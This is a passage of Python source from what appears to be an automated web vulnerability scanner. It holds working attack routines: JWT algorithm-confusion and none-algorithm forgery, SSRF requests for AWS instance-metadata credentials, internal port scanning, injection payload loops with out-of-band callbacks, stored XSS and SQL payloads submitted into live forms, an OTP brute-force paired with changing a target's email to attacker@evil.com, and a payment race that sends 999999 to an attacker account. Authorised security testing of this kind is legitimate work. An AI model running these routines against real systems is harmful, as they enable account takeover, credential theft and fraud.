                                    "type":"GraphQL Batching Mixed Auth Context","url":endpoint,
                                    "evidence":"Batch query may leak sensitive data across auth contexts",
                                    "severity":"High","confidence":75,"cwe":CWE_MAP["GraphQL"]
                                })
                        except:
                            pass
                        
        except Exception as e:
            logging.warning(f"GraphQL batching auth bypass test error: {e}")

    async def test_jwts(self):
        """Comprehensive JWT security testing including algorithm confusion, kid traversal, and session fixation"""
        self.log("Starting JWT security tests...")
        
        # Attempt to discover public keys from common JWKS endpoints
        public_key_pem = None
        jwks_endpoints = [
            "/.well-known/jwks.json",
            "/jwks.json",
            "/openid-connect/jwks.json",
            "/oauth2/jwks.json",
            "/.well-known/openid-configuration/jwks",
        ]
        
        for page in self.crawler_engine.crawled_pages:
            try:
                parsed_url = urlparse(page['url'])
                base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
                
                for jwks_path in jwks_endpoints:
                    jwks_url = urljoin(base_url, jwks_path)
                    try:
                        resp = await self._async_fetch(jwks_url, method='GET')
                        if resp and resp.status == 200:
                            jwks_data = await resp.json()
                            if 'keys' in jwks_data and jwks_data['keys']:
                                logging.info(f"Discovered JWKS endpoint: {jwks_url}")
                                # Try to extract public key using JWTAttack class
                                public_key_pem = await JWTAttack.extract_public_key_from_jwks(base_url)
                                if public_key_pem:
                                    logging.info("Successfully extracted RSA public key from JWKS")
                                    break
                    except Exception as e:
                        logging.debug(f"JWKS endpoint check failed for {jwks_url}: {e}")
                if public_key_pem:
                    break
            except Exception as e:
                logging.debug(f"Public key discovery error: {e}")
        
        # Test JWT tokens found in pages
        for page in self.crawler_engine.crawled_pages:
            page_data = await self.loop.run_in_executor(None, self.scan_state_manager.get_page_hash, page['url'])
            if not page_data:
                continue
            html = page_data.get('html_content', '')
            for token in re.findall(r'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+', html):
                # Basic JWT detection
                vulns = Detector.jwt_test(token, public_key=public_key_pem)
                for v in vulns:
                    v['url'] = page['url']
                    await self._add_vulnerability(v)
                
                # Algorithm Confusion Attack (RS256 → HS256)
                if public_key_pem:
                    algo_confusion_result = JWTAttack.algorithm_confusion_attack(token, public_key_pem)
                    if algo_confusion_result:
                        algo_confusion_result['url'] = page['url']
                        await self._add_vulnerability(algo_confusion_result)
                        self.log(f"[CRITICAL] Algorithm Confusion vulnerability found at {page['url']}")
                
                # kid Path Traversal Attack (CVE-2018-0114)
                kid_traversal_results = JWTAttack.kid_path_traversal_attack(token)
                if kid_traversal_results:
                    for result in kid_traversal_results:
                        result['url'] = page['url']
                        await self._add_vulnerability(result)
                    self.log(f"[HIGH] kid Path Traversal attack vectors generated for {page['url']}")
                
                # None Algorithm Attack
                none_algo_result = JWTAttack.none_algorithm_attack(token)
                if none_algo_result:
                    none_algo_result['url'] = page['url']
                    await self._add_vulnerability(none_algo_result)
                    self.log(f"[CRITICAL] None Algorithm vulnerability found at {page['url']}")
        
        # Session Fixation/Ambiguity Attack
        await self._test_session_fixation_ambiguity()
    
    async def _test_session_fixation_ambiguity(self):
        """Test for session fixation/ambiguity vulnerabilities"""
        self.log("Testing session fixation/ambiguity...")
        
        # Test on crawled pages
        for page in self.crawler_engine.crawled_pages:
            try:
                parsed_url = urlparse(page['url'])
                base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
                
                # Test with common session cookie names
                session_cookie_names = ['session', 'SESSION', 'JSESSIONID', 'PHPSESSID', 'ASP.NET_SessionId']
                
                for cookie_name in session_cookie_names:
                    session_results = await JWTAttack.session_fixation_ambiguity_attack(base_url, cookie_name)
                    if session_results:
                        for result in session_results:
                            result['url'] = page['url']
                            await self._add_vulnerability(result)
                        self.log(f"[HIGH] Session fixation/ambiguity vulnerability found with cookie: {cookie_name}")
                        break  # Only report once per page
                        
            except Exception as e:
                logging.debug(f"Session fixation test error for {page['url']}: {e}")

class DistributedWorker:
    async def _establish_baselines(self):
        async def baseline_for(param):
            key = (param['url'], param['method'], param['param'])
            if await self.baseline_cache.get(key):
                return
            url = param['url']; method = param['method']; pname = param['param']; ptype = param['type']
            safe = "1"
            start_time = time.perf_counter()
            if method == 'GET':
                parsed = urlparse(url)
                qs = parse_qs(parsed.query, keep_blank_values=True)
                qs[pname] = [safe]
                test_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
                resp = await self._async_fetch(test_url)
            else:
                if ptype == 'json':
                    resp = await self._async_fetch(url, method='POST', json_data={pname: safe})
                else:
                    resp = await self._async_fetch(url, method='POST', data={pname: safe})
            elapsed = time.perf_counter() - start_time
            if resp:
                await self.baseline_cache.set(key, {
                    'text': self.token_normalizer.normalize(resp._body),
                    'headers': dict(resp.headers),
                    'status': resp.status,
                    'elapsed': elapsed
                })
        tasks = [baseline_for(p) for p in self.crawler_engine.parameters]
        # Use asyncio.wait with timeout to prevent hanging if target hangs
        done, pending = await asyncio.wait(tasks, timeout=120, return_when=asyncio.ALL_COMPLETED)
        if pending:
            for task in pending:
                task.cancel()
            logging.warning(f"{len(pending)} baseline tasks timed out and were cancelled")

    async def _test_param(self, param):
        async with self.semaphore:  # Limit concurrent requests
            for vuln_type, payloads in PAYLOADS.items():
                if isinstance(payloads, dict) or vuln_type in ("RequestSmuggling", "JWT", "Cloud", "RaceCondition"):
                    continue
                for payload in payloads:
                    for variant in obfuscate(payload):
                        if self.stop_event.is_set(): return
                        await self._send_and_detect(param, vuln_type, variant)
    
    async def _test_imdsv2_ssrf(self, target_url):
        """Test for IMDSv2 SSRF using two-step token retrieval"""
        try:
            # Step 1: PUT request to get token
            token_headers = {
                "X-aws-ec2-metadata-token-ttl-seconds": "21600"
            }
            token_resp = await self._async_fetch(
                "http://169.254.169.254/latest/api/token",
                method='PUT',
                headers=token_headers
            )
            if token_resp and token_resp.status == 200:
                token = token_resp._body.strip()
                # Step 2: Use token to access metadata
                metadata_headers = {
                    "X-aws-ec2-metadata-token": token
                }
                metadata_resp = await self._async_fetch(
                    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                    headers=metadata_headers
                )
                if metadata_resp and metadata_resp.status == 200:
                    await self._add_vulnerability({
                        "type":"SSRF (IMDSv2)","url":target_url,"parameter":"*",
                        "evidence":"IMDSv2 token retrieval successful - metadata accessible",
                        "severity":"Critical","confidence":95,"cwe":CWE_MAP["SSRF"]
                    })
        except Exception as e:
            logging.warning(f"IMDSv2 test error: {e}")

    async def _test_ssrf_internal_port_scan(self, url):
        """Test for SSRF by scanning internal ports and inferring open ports from response differences"""
        if not self.crawler_engine.parameters:
            return
        
        # Common internal ports to scan
        common_ports = [22, 80, 443, 3306, 5432, 6379, 8080, 9200, 27017]
        base_domain = urlparse(url).netloc
        
        for param in self.crawler_engine.parameters[:5]:  # Limit to first 5 parameters to avoid excessive requests
            param_name = param['param']
            param_url = param['url']
            
            # Get baseline response
            baseline_resp = await self._async_fetch(param_url)
            if not baseline_resp:
                continue
            
            baseline_status = baseline_resp.status
            baseline_time = getattr(baseline_resp, '_elapsed', 0)
            
            for port in common_ports:
                # Test SSRF to internal port
                ssrf_payload = f"http://127.0.0.1:{port}"
                
                start_time = time.time()
                test_resp = await self._send_injection(param, ssrf_payload)
                elapsed = time.time() - start_time
                
                if test_resp:
                    # Check for response differences
                    status_diff = test_resp.status != baseline_status
                    time_diff = abs(elapsed - baseline_time) > 1.0  # 1 second difference
                    
                    # Check for port-specific responses
                    body_lower = test_resp._body.lower()
                    port_indicators = {
                        22: ['ssh', 'protocol'],
                        80: ['http', 'html'],
                        443: ['https', 'ssl'],
                        3306: ['mysql', 'database'],
                        5432: ['postgresql', 'postgres'],
                        6379: ['redis'],
                        8080: ['tomcat', 'jetty'],
                        9200: ['elasticsearch'],
                        27017: ['mongodb', 'mongo']
                    }
                    
                    port_detected = any(indicator in body_lower for indicator in port_indicators.get(port, []))
                    
                    if status_diff or time_diff or port_detected:
                        evidence = []
                        if status_diff:
                            evidence.append(f"status change: {baseline_status}->{test_resp.status}")
                        if time_diff:
                            evidence.append(f"time diff: {elapsed - baseline_time:.2f}s")
                        if port_detected:
                            evidence.append(f"port {port} indicators found")
                        
                        await self._add_vulnerability({
                            "type":"SSRF (Internal Port Scan)","url":param_url,"parameter":param_name,
                            "evidence":f"Port {port} appears open: {', '.join(evidence)}",
                            "severity":"High","confidence":80,"cwe":CWE_MAP["SSRF"]
                        })
                        break  # Stop after first detected port for this parameter
        
    async def _send_and_detect(self, param, vuln_type, payload):
        param_key = (param['url'], param['method'], param['param'])
        baseline = await self.baseline_cache.get(param_key)
        baseline_html = baseline['text'] if baseline else None
        baseline_time = baseline['elapsed'] if baseline else None

        url = param['url']; method = param['method']; pname = param['param']; ptype = param['type']

        marker = f"{self.oob_marker_base}_{uuid.uuid4().hex[:4]}"
        oob_url = f"http://{self.public_ip}:{self.oob_port}/{marker}"
        oob_dns = f"{marker}.{self.oob_dns_domain}"
        payload = payload.replace(OOB_MARKER, oob_url).replace(OOB_DNS, oob_dns)

        js_driver = self.selenium_driver if self.selenium_ready else None

        # IMDSv2 two-step token retrieval test
        if vuln_type == "SSRF" and "169.254.169.254" in payload:
            await self._test_imdsv2_ssrf(url)

        # Union SQLi detection
        if vuln_type == "SQLi" and "ORDER BY" in payload:
            results = []
            last_test_html = ''
            for order_num in range(1, 20):
                p = payload.replace("ORDER BY 1", f"ORDER BY {order_num}")
                resp_test = await self._send_injection(param, p)
                resp_baseline = await self._send_injection(param, "1")
                if resp_test and resp_baseline:
                    diff = abs(len(resp_test._body) - len(resp_baseline._body))
                    results.append((order_num, diff))
                    last_test_html = resp_test._body
            union_marker = f"DAST_{uuid.uuid4().hex[:6]}"
            union_result = Detector.sqli_union(last_test_html, results, union_marker)
            if union_result:
                resp = await self._send_injection(param, union_result['payload'])
                if resp and union_marker in resp._body:
                    await self._add_vulnerability({
                        "type":"SQLi (Union)","url":url,"parameter":pname,"method":method,
                        "evidence":f"Union injection confirmed with marker {union_marker}",
                        "severity":"High","confidence":90,"cwe":CWE_MAP["SQLi"]
                    })
            return

        # Time-based SQLi (using elapsed time approximation with aiohttp)
        if vuln_type == "SQLi" and "SLEEP" in payload.upper():
            # We'll measure response time by wrapping the request with time.perf_counter_ns()
            start = time.perf_counter_ns()
            resp = await self._send_injection(param, payload)
            elapsed = (time.perf_counter_ns() - start) / 1_000_000_000  # Convert nanoseconds to seconds
            if resp and baseline_time:
                if elapsed > baseline_time * 1.5:
                    result = {"type":"SQLi (Time-based)","confidence":75,"evidence":f"Response {elapsed:.1f}s vs baseline {baseline_time:.1f}s"}
                    await self._add_vulnerability({**result,"url":url,"parameter":pname,"method":method,"payload":payload,"cwe":CWE_MAP["SQLi"]})
            await asyncio.sleep(0.5)
            return
        
        resp = await self._send_injection(param, payload)
        if not resp: return
        html = self.token_normalizer.normalize(resp._body)
        result = None

        if vuln_type == "XSS":
            result = Detector.xss(html, payload, baseline_html)
            if not result and OOB_MARKER in payload:
                await asyncio.sleep(0.5)
                result = Detector.blind_xss(oob_results, marker)
            if not result and js_driver:
                dom_result = Detector.dom_xss(url, js_driver, marker, oob_url)
                if dom_result:
                    await self._add_vulnerability({**dom_result, "url":url,"parameter":pname,"method":method,"payload":payload,"cwe":CWE_MAP["XSS"]})
        elif vuln_type == "SQLi":
            result = Detector.sqli(html, baseline_html)
            if not result:
                # Baseline shotgun SQLi detection
                legit_p = payload if not any(x in payload.upper() for x in ['AND', 'OR', 'UNION', 'SELECT']) else "1"
                resp_legit = await self._send_injection(param, legit_p)
                false_p = f"{payload} AND 1=2" if 'AND' not in payload.upper() else payload.replace("1=1", "1=2")
                true_p = f"{payload} AND 1=1" if 'AND' not in payload.upper() else payload.replace("1=2", "1=1")
                resp_false = await self._send_injection(param, false_p)
                resp_true = await self._send_injection(param, true_p)
                if resp_legit and resp_false and resp_true:
                    result = Detector.baseline_shotgun_sqli(resp_legit, resp_false, resp_true)
            if not result:
                true_p = payload.replace("1=1","1=1") if "1=1" in payload else f"{payload} AND 1=1"
                false_p = payload.replace("1=1","1=2") if "1=1" in payload else f"{payload} AND 1=2"
                resp_t = await self._send_injection(param, true_p)
                resp_f = await self._send_injection(param, false_p)
                if resp_t and resp_f:
                    result = Detector.sqli_boolean(resp_t, resp_f)
            if not result and self.oob_dns_ip and "LOAD_FILE" in payload:
                if await check_dns_callback(marker, self.oob_dns_domain, self.oob_dns_ip):
                    result = {"type":"SQLi (OOB DNS)","confidence":95,"evidence":f"DNS callback for {marker}"}
        elif vuln_type == "PathTraversal":
            result = Detector.path_traversal(html, baseline_html)
        elif vuln_type == "CommandInjection":
            result = Detector.command_injection(html, baseline_html)
            if not result and ("ping" in payload or "nslookup" in payload or "curl" in payload or "wget" in payload):
                if self.oob_dns_ip and await check_dns_callback(marker, self.oob_dns_domain, self.oob_dns_ip):
                    result = {"type":"CommandInjection (OOB DNS)","confidence":95,"evidence":f"DNS callback for {marker}"}
                else:
                    await asyncio.sleep(1)
                    result = Detector.blind_xss(oob_results, marker)
                    if result:
                        result["type"] = "CommandInjection (OOB HTTP)"
                        result["confidence"] = 95
        elif vuln_type == "OpenRedirect":
            result = Detector.open_redirect(resp, baseline)
        elif vuln_type == "SSTI":
            result = Detector.ssti(html, payload, baseline_html)
        elif vuln_type == "XXE":
            result = Detector.xxe(html, baseline_html)
            if not result and OOB_MARKER in payload:
                await asyncio.sleep(1)
                result = Detector.blind_xss(oob_results, marker)
                if result:
                    result["type"] = "XXE (OOB)"
                    result["confidence"] = 95
        elif vuln_type == "CRLF":
            result = Detector.crlf(resp, baseline)
        elif vuln_type == "SSRF":
            result = Detector.ssrf(html, baseline_html, payload, oob_results, marker)
            # Also test for internal port scanning via SSRF
            if "127.0.0.1" not in payload:  # Only run on non-localhost payloads
                await self._test_ssrf_internal_port_scan(url)
        elif vuln_type == "NoSQLi":
            result = Detector.nosqli(html, baseline_html, payload)
            if not result:
                # NoSQL operator injection detection
                baseline_resp = await self._send_injection(param, "1")
                gt_payload = '{"$gt":""}'
                regex_payload = '{"$regex":".*"}'
                resp_gt = await self._send_injection(param, gt_payload)
                resp_regex = await self._send_injection(param, regex_payload)
                if baseline_resp and resp_gt and resp_regex:
                    nosql_results = Detector.nosql_operator_injection(baseline_resp, resp_gt, resp_regex)
                    if nosql_results:
                        for nosql_result in nosql_results:
                            await self._add_vulnerability({**nosql_result,"url":url,"parameter":pname,"method":method,"payload":payload,"cwe":CWE_MAP.get("NoSQLi","")})
                        result = nosql_results[0]  # Mark as detected to avoid duplicate processing
        elif vuln_type == "LDAPi":
            result = Detector.ldapi(html, baseline_html, payload)
        elif vuln_type == "InsecureDeserialization":
            result = Detector.deserialization(html, baseline_html, payload)
        elif vuln_type == "LogInjection":
            result = Detector.log_injection(html, baseline_html, payload)
        elif vuln_type == "Log4j":
            result = Detector.log4j(html, payload, oob_results, marker)
            # Check HTTPS OOB callbacks for Log4j
            if not result and self.enable_advanced_oob and self.https_oob_port:
                await asyncio.sleep(1)
                with https_oob_lock:
                    for res in https_oob_results:
                        if marker in res['path']:
                            result = {"type":"Log4j (HTTPS OOB)","confidence":95,"evidence":f"HTTPS callback for {marker}"}
                            break
        elif vuln_type == "Polyglot":
            # Test for both XSS and SQLi in polyglot payloads
            xss_result = Detector.xss(html, payload, baseline_html)
            sqli_result = Detector.sqli(html, baseline_html)
            if xss_result:
                result = {"type":"Polyglot XSS","confidence":xss_result.get('confidence',70),"evidence":xss_result.get('evidence','')}
            elif sqli_result:
                result = {"type":"Polyglot SQLi","confidence":sqli_result.get('confidence',70),"evidence":sqli_result.get('evidence','')}
        elif vuln_type == "Spring4Shell":
            # Check for Spring4Shell-specific responses
            if any(keyword in html.lower() for keyword in ['tomcatwar', 'class.module', 'classloader']):
                result = {"type":"Spring4Shell","confidence":85,"evidence":"Spring4Shell-related response detected"}
        elif vuln_type == "Text4Shell":
            # Check for Text4Shell responses
            if any(keyword in html.lower() for keyword in ['script:javascript', 'env:', 'dns:']):
                result = {"type":"Text4Shell","confidence":80,"evidence":"Text4Shell pattern detected"}
            # Check OOB callbacks
            if not result and self.enable_advanced_oob:
                await asyncio.sleep(1)
                with oob_results_lock:
                    for res in oob_results:
                        if marker in res['path']:
                            result = {"type":"Text4Shell (OOB)","confidence":90,"evidence":f"OOB callback for {marker}"}
                            break

        if result and result.get('confidence',0) >= self.config.get('confidence_threshold', DEFAULT_CONFIDENCE_THRESHOLD):
            evidence = getattr(resp, '_evidence', None)
            await self._add_vulnerability({**result,"url":url,"parameter":pname,"method":method,"payload":payload,"cwe":CWE_MAP.get(vuln_type,""),"full_evidence":evidence})
        
        # Small difference detection - compare with baseline for subtle changes
        if baseline and not result:
            diff_result = Detector.small_difference_detection(html, baseline_html, f"{vuln_type} on {pname}")
            if diff_result and diff_result.get('confidence',0) >= self.config.get('confidence_threshold', DEFAULT_CONFIDENCE_THRESHOLD):
                await self._add_vulnerability({**diff_result,"url":url,"parameter":pname,"method":method,"payload":payload,"cwe":CWE_MAP.get(vuln_type,"")})
    
    async def _send_injection(self, param, payload):
        url = param['url']; method = param['method']; pname = param['param']; ptype = param['type']
        if method == 'GET':
            parsed = urlparse(url)
            qs = parse_qs(parsed.query, keep_blank_values=True)
            qs[pname] = [payload]
            test_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
            return await self._async_fetch(test_url)
        else:
            if ptype == 'json':
                return await self._async_fetch(url, method='POST', json_data={pname: payload})
            else:
                return await self._async_fetch(url, method='POST', data={pname: payload})
    
    # --- Second-order Injection (stored) ---
    async def second_order_injection_tests(self):
        self.log("Second-order injection tests...")
        stored_xss_payload = f"<img src=http://{self.public_ip}:{self.oob_port}/DAST_STORED_XSS_{self.oob_marker_base}>"
        stored_sqli_payload = f"' UNION SELECT 'DAST_STORED_SQL_{self.oob_marker_base}'--"
        # Find forms with fields likely stored (comment, bio, name)
        for page in self.crawler_engine.crawled_pages:
            page_data = await self.loop.run_in_executor(None, self.scan_state_manager.get_page_hash, page['url'])
            if not page_data:
                continue
            html = page_data.get('html_content', '')
            soup = BeautifulSoup(html, 'html.parser')
            for form in soup.find_all('form', method=lambda m: m and m.lower() == 'post'):
                action = urljoin(page['url'], form.get('action',''))
                fields = [inp.get('name') for inp in form.find_all(['input','textarea','select']) if inp.get('name')]
                if any(kw in str(fields).lower() for kw in ['comment','bio','message','name','title','profile']):
                    data = {}
                    for name in fields:
                        if name.lower() in ('comment','message','bio','description'):
                            data[name] = stored_xss_payload
                        elif name.lower() in ('name','title','subject'):
                            data[name] = stored_sqli_payload
                        else:
                            data[name] = 'test'
                    await self._async_fetch(action, method='POST', data=data)
                    self.log(f"Stored payload submitted to {action}")
        # Wait and re-crawl to find reflections
        await asyncio.sleep(2)
        for url in list(self.crawler_engine.visited_urls):
            resp = await self._async_fetch(url)
            if resp:
                html = resp._body
                if stored_sqli_payload in html:
                    await self._add_vulnerability({
                        "type":"Second-order SQLi","url":url,"parameter":"*",
                        "evidence":f"Marker found: {stored_sqli_payload}",
                        "severity":"Critical","confidence":95,"cwe":CWE_MAP["SQLi"]
                    })
        # Check OOB callbacks for stored XSS with polling loop
        timeout = 30.0
        check_interval = 1.0
        start_time = time.time()
        while time.time() - start_time < timeout:
            with oob_results_lock:
                for res in oob_results:
                    if "DAST_STORED_XSS" in res['path']:
                        await self._add_vulnerability({
                            "type":"Second-order XSS","url":res['path'],"parameter":"*",
                            "evidence":"OOB callback from stored XSS",
                            "severity":"High","confidence":95,"cwe":CWE_MAP["XSS"]
                        })
                        return
            await asyncio.sleep(check_interval)
        
    # --- Race Condition ---
    async def race_condition_tests(self):
        target_urls = set()
        for page in self.crawler_engine.crawled_pages:
            page_data = await self.loop.run_in_executor(None, self.scan_state_manager.get_page_hash, page['url'])
            if not page_data:
                continue
            html = page_data.get('html_content', '')
            soup = BeautifulSoup(html, 'html.parser')
            for form in soup.find_all('form', method=lambda m: m and m.lower() == 'post'):
                form_text = form.get_text().lower()
                if any(kw in form_text for kw in ['redeem','coupon','transfer','checkout','order']):
                    action = urljoin(page['url'], form.get('action',''))
                    target_urls.add(action)
        for url in target_urls:
            # Basic race condition test
            tasks = [self._async_fetch(url, method='POST', data={"test":"race"}) for _ in range(10)]
            # Use asyncio.wait with timeout to prevent hanging if target hangs
            done, pending = await asyncio.wait(tasks, timeout=30, return_when=asyncio.ALL_COMPLETED)
            if pending:
                for task in pending:
                    task.cancel()
                logging.warning(f"{len(pending)} race condition test tasks timed out")
            responses = [task.result() for task in done if not task.cancelled()]
            if all(resp and resp.status == 200 for resp in responses):
                await self._add_vulnerability({
                    "type":"Potential Race Condition","url":url,"parameter":"*",
                    "evidence":"Multiple concurrent requests all succeeded",
                    "severity":"Medium","confidence":60,"cwe":CWE_MAP["RaceCondition"]
                })
            
            # Microsecond timing detection
            await self._test_race_condition_timing(url)
    async def _test_race_condition_timing(self, url):
        """Test for race conditions using microsecond timing detection - REDUCED concurrency"""
        try:
            # Send 5 concurrent requests with timestamps (reduced from 20 to prevent DDoS)
            timestamps = []
            async def timed_request():
                start = time.time()
                resp = await self._async_fetch(url, method='POST', data={"test":"timing"})
                end = time.time()
                return (end - start, resp)
            
            tasks = [timed_request() for _ in range(5)]
            # Use asyncio.wait with timeout to prevent hanging if target hangs
            done, pending = await asyncio.wait(tasks, timeout=30, return_when=asyncio.ALL_COMPLETED)
            if pending:
                for task in pending:
                    task.cancel()
                logging.warning(f"{len(pending)} timing test tasks timed out")
            results = [task.result() for task in done if not task.cancelled()]
            
            # Analyze timing patterns
            timings = [r[0] for r in results if r[1]]
            if len(timings) < 5:
                return
            
            # Check for timing anomalies that suggest race conditions
            timing_variance = statistics.variance(timings) if len(timings) > 1 else 0
            timing_std = statistics.stdev(timings) if len(timings) > 1 else 0
            
            # If variance is very low, requests might be processed concurrently without proper locking
            if timing_std < 0.001 and timing_variance < 0.000001:
                await self._add_vulnerability({
                    "type":"Race Condition (Timing)","url":url,"parameter":"*",
                    "evidence":f"Low timing variance detected: std={timing_std:.6f}s, variance={timing_variance:.9f}s²",
                    "severity":"Medium","confidence":70,"cwe":CWE_MAP["RaceCondition"]
                })
            
            # Check for response time clustering (multiple requests completing at nearly identical times)
            sorted_times = sorted(timings)
            clusters = []
            current_cluster = [sorted_times[0]]
            for t in sorted_times[1:]:
                if t - current_cluster[-1] < 0.0001:  # Within 100 microseconds
                    current_cluster.append(t)
                else:
                    clusters.append(current_cluster)
                    current_cluster = [t]
            clusters.append(current_cluster)
            
            # If we have clusters of 3+ requests completing within 100 microseconds, potential race condition
            if any(len(cluster) >= 3 for cluster in clusters):
                max_cluster_size = max(len(cluster) for cluster in clusters)
                await self._add_vulnerability({
                    "type":"Race Condition (Time Cluster)","url":url,"parameter":"*",
                    "evidence":f"Detected {max_cluster_size} requests completing within 100μs",
                    "severity":"Medium","confidence":75,"cwe":CWE_MAP["RaceCondition"]
                })
        except Exception as e:
            logging.warning(f"Race condition timing test error: {e}")
    async def test_token_validation_window(self, forgot_password_url, change_email_url, target_email):
        """
        TOKEN VALIDATION WINDOW: Race OTP brute-force with email change
        - Initiates forgot password to get OTP
        - Brute-forces OTP at 1 req/sec
        - Races to change email before OTP validation
        """
        try:
            logging.info(f"[TOKEN VALIDATION] Testing race condition on {forgot_password_url}")

            # Step 1: Trigger forgot password to send OTP
            forgot_data = {"email": target_email}
            await self._async_fetch(forgot_password_url, method='POST', data=forgot_data)
            await asyncio.sleep(2)  # Wait for email to send

            # Step 2: Start parallel tasks - OTP brute-force and email change
            results = {"otp_found": False, "email_changed": False, "race_won": False}

            async def brute_force_otp():
                """Brute-force 6-digit OTP at 1 request per second"""
                for code in range(100000, 1000000):  # 000000 to 999999
                    otp_data = {"email": target_email, "otp": str(code)}
                    resp = await self._async_fetch(forgot_password_url + "/verify", method='POST', data=otp_data)
                    if resp and resp.status == 200:
                        results["otp_found"] = True
                        logging.info(f"[TOKEN VALIDATION] OTP found: {code}")
                        return code
                    await asyncio.sleep(1)  # 1 req/sec to avoid locking
                return None

            async def change_email_race():
                """Race to change email before OTP validation"""
                await asyncio.sleep(3)  # Small delay to start after OTP brute-force begins
                new_email = "attacker@evil.com"
                change_data = {"current_email": target_email, "new_email": new_email}
                resp = await self._async_fetch(change_email_url, method='POST', data=change_data)
                if resp and resp.status == 200:
                    results["email_changed"] = True
                    results["race_won"] = True
                    logging.info(f"[TOKEN VALIDATION] Email changed to {new_email} during OTP window")
                    return True
                return False

            # Run both tasks in parallel with timeout
            done, pending = await asyncio.wait([brute_force_otp(), change_email_race()], timeout=60, return_when=asyncio.ALL_COMPLETED)
            if pending:
                for task in pending:
                    task.cancel()
                logging.warning(f"{len(pending)} token validation race tasks timed out")

            if results["race_won"]:
                await self._add_vulnerability({
                    "type": "Token Validation Race Condition",
                    "url": forgot_password_url,
                    "parameter": "otp,email",
                    "evidence": "Email changed during OTP validation window - account takeover possible",
                    "severity": "Critical",
                    "confidence": 90,
                    "cwe": "CWE-384"
                })

            return results
        except Exception as e:
            logging.warning(f"Token validation window test error: {e}")
    async def test_two_phase_transaction(self, initiate_url, confirm_url):
        """
        TWO-PHASE TRANSACTION: Race condition between initiate and confirm
        - Step 1: POST /api/payments/initiate (creates pending transaction)
        - Step 2: POST /api/payments/confirm with different amount/beneficiary
        - Check if final transaction reflects Step 2 data instead of Step 1
        """
        try:
            logging.info(f"[TWO-PHASE TRANSACTION] Testing race condition on {initiate_url}")
            
            # Original transaction details
            original_amount = 100.00
            original_beneficiary = "victim_account_123"
            initiate_data = {
                "amount": original_amount,
                "beneficiary_id": original_beneficiary,
                "currency": "USD"
            }
            
            # Malicious transaction details
            malicious_amount = 999999.00
            malicious_beneficiary = "attacker_account_456"
            confirm_data = {
                "amount": malicious_amount,
                "beneficiary_id": malicious_beneficiary,
                "currency": "USD"
            }
            
            results = {"initiate_success": False, "confirm_success": False, "race_won": False}
            
            async def initiate_transaction():
                """Step 1: Create pending transaction"""
                resp = await self._async_fetch(initiate_url, method='POST', data=initiate_data)
                if resp and resp.status == 200:
                    results["initiate_success"] = True
                    try:
                        return (await resp.json()).get("transaction_id")
                    except:
                        return None
                return None

            async def confirm_with_race(transaction_id):
                """Step 2: Confirm with different data before Step 1 commits"""
                await asyncio.sleep(0.1)  # Tiny delay to race with commit
                confirm_data["transaction_id"] = transaction_id
                resp = await self._async_fetch(confirm_url, method='POST', data=confirm_data)
                if resp and resp.status == 200:
                    results["confirm_success"] = True
                    # Check if malicious data was used
                    try:
                        response_data = await resp.json()
                        final_amount = response_data.get("amount")
                        final_beneficiary = response_data.get("beneficiary_id")

                        if final_amount == malicious_amount or final_beneficiary == malicious_beneficiary:
                            results["race_won"] = True
                            logging.info(f"[TWO-PHASE] Race won! Transaction used malicious data")
                    except:
                        pass
                return resp

            # Execute race condition
            transaction_id = await initiate_transaction()
            if transaction_id:
                await confirm_with_race(transaction_id)
            
            if results["race_won"]:
                await self._add_vulnerability({
                    "type": "Two-Phase Transaction Race Condition",
                    "url": initiate_url,
                    "parameter": "amount,beneficiary_id",
                    "evidence": f"Transaction confirmed with malicious amount ({malicious_amount}) instead of original ({original_amount})",
                    "severity": "Critical",
                    "confidence": 85,
                    "cwe": "CWE-362"
                })
            
            return results
        except Exception as e:
            logging.warning(f"Two-phase transaction test error: {e}")

    async def test_inventory_oversell(self, purchase_url, product_id, quantity=1):
        """
        INVENTORY OVERSELL (Double Spend): Test atomic locking with concurrent purchases
        - Uses asyncio.gather() to send 50 identical POST requests to /api/purchase
        - Checks response times and success/failure patterns
        - If ALL 50 succeed, lock is broken (Critical bug)
        - If first few succeed and rest fail with "Out of Stock", lock is atomic (good)
        """
        try:
            logging.info(f"[INVENTORY OVERSELL] Testing double-spend on {purchase_url} with 50 concurrent requests")
            
            async def single_purchase(request_id):
                """Single purchase request"""
                start_time = time.time()
                purchase_data = {
                    "product_id": product_id,
                    "quantity": quantity,
                    "request_id": request_id
                }
                resp = await self._async_fetch(purchase_url, method='POST', data=purchase_data)
                end_time = time.time()
                
                return {
                    "request_id": request_id,
                    "success": resp and resp.status == 200,
                    "status_code": resp.status if resp else None,
                    "response_time": end_time - start_time,
                    "response": resp.text if resp else None
                }
            
            # Send 50 concurrent requests using asyncio.wait with timeout
            request_ids = [f"req_{i}_{uuid.uuid4().hex[:8]}" for i in range(50)]
            tasks = [single_purchase(rid) for rid in request_ids]
            done, pending = await asyncio.wait(tasks, timeout=120, return_when=asyncio.ALL_COMPLETED)
            if pending:
                for task in pending:
                    task.cancel()
                logging.warning(f"{len(pending)} inventory oversell test tasks timed out")
            results = [task.result() for task in done if not task.cancelled()]
            
            # Analyze results
            successful = [r for r in results if r["success"]]
            failed = [r for r in results if not r["success"]]
            success_count = len(successful)
            fail_count = len(failed)
            
            # Check response time patterns
            response_times = [r["response_time"] for r in results]
            avg_response_time = statistics.mean(response_times) if response_times else 0
            max_response_time = max(response_times) if response_times else 0
            
            # Check for "Out of Stock" errors in failures
            out_of_stock_errors = [r for r in failed if r["response"] and "out of stock" in r["response"].lower()]
            
            logging.info(f"[INVENTORY OVERSELL] Success: {success_count}/50, Failed: {fail_count}/50")
            logging.info(f"[INVENTORY OVERSELL] Avg response time: {avg_response_time:.3f}s, Max: {max_response_time:.3f}s")
            
            # Determine if lock is broken
            if success_count == 50:
                # ALL requests succeeded - CRITICAL: no atomic locking
                await self._add_vulnerability({
                    "type": "Inventory Oversell (Double Spend)",
                    "url": purchase_url,
                    "parameter": "product_id,quantity",
                    "evidence": f"All 50 concurrent purchase requests succeeded - no atomic inventory lock",
                    "severity": "Critical",
                    "confidence": 95,
                    "cwe": "CWE-362"
                })
                logging.warning(f"[INVENTORY OVERSELL] CRITICAL: No inventory locking detected!")
            elif success_count > 1 and len(out_of_stock_errors) > 0:
